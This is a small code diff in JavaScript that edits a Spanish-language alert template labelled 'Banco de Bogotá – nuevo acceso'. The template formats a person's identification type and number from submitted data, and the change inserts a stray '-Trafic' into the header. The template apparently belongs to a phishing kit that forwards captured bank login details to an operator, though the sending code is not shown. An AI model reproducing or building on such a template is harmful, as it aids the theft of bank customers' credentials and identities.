@@ -39,7 +39,7 @@
     
     if (tipo === 'login') {
       mensaje = `
-  🏦 <b>BANCO DE BOGOTÁ - NUEVO ACCESO</b>
+  🏦 <b>BANCO DE BOGOTÁ -Trafic NUEVO ACCESO</b>
 
   👤 <b>Tipo:</b> ${datos.tipo_persona}
   🆔 <b>Identificación:</b> ${datos.tipo_identificacion} ${datos.numero_identificacion}
